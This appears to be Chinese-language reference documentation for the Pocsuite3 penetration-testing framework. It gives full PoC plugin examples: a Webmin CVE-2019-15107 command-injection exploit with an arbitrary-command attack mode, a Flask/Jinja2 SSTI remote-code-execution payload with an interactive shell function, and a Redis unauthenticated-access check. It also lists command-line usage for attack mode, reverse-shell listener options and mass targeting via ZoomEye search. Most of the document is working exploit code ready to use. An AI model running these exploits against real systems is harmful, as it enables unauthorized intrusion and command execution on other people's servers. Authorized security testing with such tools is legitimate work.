# Pocsuite3 完整示例与用法

> 参考完整 PoC 代码结构、命令行用法和最佳实践。

---

## 示例 1：HTTP — Webmin RCE（CVE-2019-15107）

```python
from collections import OrderedDict
from urllib.parse import urljoin
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, OptString, VUL_TYPE, POC_CATEGORY

class WebminPOC(POCBase):
    vulID = 'CVE-2019-15107'
    version = '1.0'
    author = ['anonymous']
    vulDate = '2019-08-16'
    createDate = '2024-01-01'
    updateDate = '2024-01-01'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2019-15107']
    name = 'Webmin 1.890 未授权远程命令执行'
    appPowerLink = 'http://www.webmin.com/'
    appName = 'Webmin'
    appVersion = '1.880 - 1.890'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''Webmin password_change.cgi 中 expired 参数可执行任意命令。'''
    samples = []

    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString('id', description='要执行的命令')
        return o

    def _verify(self):
        result = {}
        payload = 'user=root&pam=&expired=2|id'
        try:
            r = requests.post(
                self.url.rstrip('/') + '/password_change.cgi',
                data=payload,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=10, verify=False
            )
            if r.status_code == 200 and 'uid=0' in r.text:
                result['VerifyInfo'] = {'URL': self.url, 'Payload': payload}
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def _attack(self):
        result = {}
        cmd = self.get_option("cmd")
        payload = f'user=root&pam=&expired=2|{cmd}'
        try:
            r = requests.post(
                self.url.rstrip('/') + '/password_change.cgi',
                data=payload,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=10, verify=False
            )
            if r.status_code == 200:
                result['AttackInfo'] = {'URL': self.url, 'Command': cmd, 'Result': r.text}
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result: output.success(result)
        else: output.fail('target is not vulnerable')
        return output

register_poc(WebminPOC)
```

---

## 示例 2：HTTP — Flask/Jinja2 SSTI RCE

```python
from collections import OrderedDict
from urllib.parse import urljoin
from pocsuite3.api import (
    Output, POCBase, register_poc, logger, requests,
    OptString, VUL_TYPE, POC_CATEGORY
)

class FlaskSSTIPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = ['SecurityResearcher']
    name = 'Flask (Jinja2) SSTI RCE'
    appPowerLink = 'https://palletsprojects.com/p/flask/'
    appName = 'Flask'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    desc = 'Flask Jinja2 模板注入导致远程代码执行。'
    samples = ['http://127.0.0.1:8000']

    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString('id', description='执行的系统命令', require=False)
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/?name="
        payload = "{{22*22}}"  # 无害数学运算
        try:
            resp = requests.get(url + payload, timeout=10)
            if resp and resp.status_code == 200 and "484" in resp.text:
                result['VerifyInfo'] = {'URL': url, 'Payload': payload}
                logger.info("[+] Target is vulnerable to SSTI!")
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def _attack(self):
        result = {}
        url = self.url.rstrip('/') + "/?name="
        cmd = self.get_option("cmd")
        attack_payload = (
            "{% for c in [].__class__.__base__.__subclasses__() %}"
            "{% if c.__name__ == 'catch_warnings' %}"
            "{% for b in c.__init__.__globals__.values() %}"
            "{% if b.__class__ == {}.__class__ %}"
            "{% if 'eval' in b.keys() %}"
            "{{ b['eval']('__import__(\"os\").popen(\"" + cmd + "\").read()') }}"
            "{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}"
        )
        try:
            resp = requests.get(url + attack_payload, timeout=15)
            if resp and resp.status_code == 200:
                result['AttackInfo'] = {'URL': url, 'Command': cmd, 'Output': resp.text.strip()}
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def _shell(self):
        return self.interactive_shell

    def interactive_shell(self, command):
        url = self.url.rstrip('/') + "/?name="
        shell_payload = (
            "{% for c in [].__class__.__base__.__subclasses__() %}"
            "{% if c.__name__ == 'catch_warnings' %}"
            "{% for b in c.__init__.__globals__.values() %}"
            "{% if b.__class__ == {}.__class__ %}"
            "{% if 'eval' in b.keys() %}"
            "{{ b['eval']('__import__(\"os\").popen(\"" + command + "\").read()') }}"
            "{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}"
        )
        try:
            resp = requests.get(url + shell_payload, timeout=15)
            return resp.text.strip() if resp.status_code == 200 else f"[!] HTTP {resp.status_code}"
        except Exception as e:
            return f"[!] Error: {str(e)}"

    def parse_output(self, result):
        output = Output(self)
        if result: output.success(result)
        else: output.fail('Target is not vulnerable to Flask SSTI')
        return output

register_poc(FlaskSSTIPOC)
```

---

## 示例 3：非 HTTP 协议 — Redis 未授权访问

```python
import socket
from pocsuite3.api import (
    Output, POCBase, register_poc, logger,
    POC_CATEGORY, VUL_TYPE
)

class RedisUnauthPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = ['anonymous']
    name = 'Redis 未授权访问'
    appName = 'Redis'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    category = POC_CATEGORY.EXPLOITS.REMOTE
    protocol = POC_CATEGORY.PROTOCOL.REDIS
    protocol_default_port = 6379
    desc = '检测 Redis 未授权访问。'

    def _verify(self):
        result = {}
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.rhost, self.rport))
            s.send(b'INFO\r\n')
            data = s.recv(1024)
            s.close()
            if b'redis_version' in data or b'redis_mode' in data:
                result['VerifyInfo'] = {
                    'Host': self.rhost, 'Port': self.rport,
                    'Info': data.decode('utf-8', errors='ignore')[:200]
                }
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result: output.success(result)
        else: output.fail('target is not vulnerable')
        return output

register_poc(RedisUnauthPOC)
```

---

## 命令行用法

```bash
# 验证模式（默认）
pocsuite -r poc.py -u http://target.com
pocsuite -r poc.py -u http://target.com --verify

# 攻击模式
pocsuite -r poc.py -u http://target.com --attack
pocsuite -r poc.py -u http://target.com --attack --cmd "whoami"

# Shell 交互模式
pocsuite -r poc.py -u http://target.com --shell
pocsuite -r poc.py -u http://target.com --shell --lhost 192.168.1.1 --lport 4444

# 批量目标
pocsuite -r poc.py -f targets.txt
pocsuite -r poc.py --dork "webmin"           # ZoomEye 搜索目标

# 从 Seebug 加载
pocsuite -u http://target.com --ssvid 12345

# 自定义参数
pocsuite -r poc.py -u http://target.com --attack --username admin --password test

# 调试
pocsuite -r poc.py -u http://target.com -v 3
```

---

## 编程接口

```python
from pocsuite3.api import init_pocsuite, start_pocsuite, get_results

init_pocsuite({'url': 'http://target.com', 'poc': 'poc.py', 'mode': 'verify'})
start_pocsuite()
for r in get_results():
    print(r.to_dict())
```

---

## 最佳实践

1. **必须 `register_poc()`** 注册
2. **网络请求设 timeout**，避免挂死
3. **verify 只读**，不修改目标
4. **用 `self.parse_output()`** 统一输出
5. **`self.url` 已由 `_check()` 预处理**，直接使用
6. **非 HTTP 协议**设 `protocol` + `protocol_default_port`
7. **URL 拼接用 `urljoin()`** 不用字符串拼接
8. **Shell 模式 `{0}`/`{1}` 占位符**自动替换为监听地址/端口
9. **异常处理要完善**，`try/except` 包裹所有网络操作
10. **元信息尽量齐全**：vulID、references、appName、appVersion、vulType、category
